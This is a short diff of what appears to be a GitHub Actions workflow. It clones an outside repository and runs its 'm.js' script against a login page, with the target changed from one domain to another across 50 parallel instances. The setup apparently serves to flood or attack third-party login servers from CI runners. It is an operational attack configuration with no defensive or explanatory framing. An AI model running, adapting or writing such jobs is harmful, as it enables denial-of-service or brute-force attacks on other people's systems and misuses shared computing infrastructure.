@@ -45,7 +45,7 @@ jobs:
         run: |
           git clone https://github.com/vrbrh921-glitch/Fc.git
           cd Fc
-          node m.js https://bgmicheat.vipsververrpanel.xyz/adminlogin 300 1 1 2
+          node m.js https://viptop.shop/OneShotLoader/login 300 1 1 2
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
